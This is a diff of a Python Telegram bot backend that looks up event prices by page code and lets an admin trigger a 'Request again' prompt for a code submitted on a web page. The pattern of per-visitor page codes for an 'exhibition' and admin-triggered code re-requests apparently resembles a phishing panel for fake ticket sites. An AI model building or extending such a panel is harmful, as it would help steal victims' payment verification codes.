@@ -195,14 +195,33 @@ def get_page_code_for_user(uid):
 def get_event_info_by_page_code(page_code):
     """Отримує інформацію про подію за page_code"""
     c = conn.cursor()
-    c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
-    row = c.fetchone()
-    if row:
-        return {
-            'price': row[0],
-            'currency': row[1],
-            'street': row[2]
-        }
+    
+    # Спочатку шукаємо в таблиці event_links (основна таблиця)
+    try:
+        c.execute('SELECT price, currency FROM event_links WHERE event_code=?', (page_code,))
+        row = c.fetchone()
+        if row:
+            return {
+                'price': row[0],
+                'currency': row[1],
+                'street': None
+            }
+    except Exception as e:
+        print(f"[get_event_info_by_page_code] Error in event_links: {e}")
+    
+    # Якщо не знайдено, шукаємо в site_users (для зворотної сумісності)
+    try:
+        c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
+        row = c.fetchone()
+        if row:
+            return {
+                'price': row[0],
+                'currency': row[1],
+                'street': row[2]
+            }
+    except Exception as e:
+        print(f"[get_event_info_by_page_code] Error in site_users: {e}")
+    
     return None
 
 def get_admin_username_by_user_id(user_id):
@@ -2578,7 +2597,7 @@ async def events_save_all(message):
             return
         events[event_id] = {
             'title': user_event.get('title', 'Выставка'),
-            'price': user_event.get('price', '45'),
+            'price': user_event.get('price', 'Не указано'),
             'currency': user_event.get('currency', 'EUR'),
             'address': user_event.get('address', ''),
             'events': [
@@ -2593,7 +2612,7 @@ async def events_save_all(message):
         with open(events_file, 'w', encoding='utf-8') as f:
             json.dump(events, f, ensure_ascii=False, indent=2)
         # --- Створюємо запис у site_users ---
-        price = user_event.get('price', '45')
+        price = user_event.get('price', 'Не указано')
         currency = user_event.get('currency', 'EUR')
         street = user_event.get('address', '')
         dates = user_event.get('dates', [''] * 8)
@@ -2862,7 +2881,7 @@ async def code_notify(request):
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{page_code}")
+                InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{code_value}")
             ]
         ]
     )
@@ -3068,15 +3087,15 @@ async def admin_action_handler(call: types.CallbackQuery):
         print(f'[DEBUG] Text action completed, user_step set to: {user_step[call.from_user.id]}')
         return
     elif action == 'code_request_again':
-        print(f'[DEBUG] Processing CODE_REQUEST_AGAIN action for page_code={page_code}')
+        print(f'[DEBUG] Processing CODE_REQUEST_AGAIN action for code={page_code}')
         if not page_code:
-            await call.answer("❌ Помилка: відсутній page_code")
+            await call.answer("❌ Помилка: відсутній код")
             return
             
         import aiohttp as aiohttp_client
         async with aiohttp_client.ClientSession() as session:
             try:
-                # Встановлюємо флаг для повторного запиту коду на цій сторінці
+                # Встановлюємо флаг для повторного запиту коду
                 resp = await session.post('http://127.0.0.1:8080/set_request_again', json={'code': page_code})
                 print(f'[DEBUG] Code request again response: {resp.status}')
                 
@@ -3211,7 +3230,7 @@ async def events_data_for_main_page(request):
     # Формуємо відповідь у форматі events.json
     data = {
         'title': 'Выставка',
-        'price': row[10] or '45',
+        'price': row[10] or 'Не указано',
         'currency': row[8] or 'EUR',
         'address': row[9] or 'plac Stanisława Małachowskiego 3, 00-916 Warszawa',
         'events': [
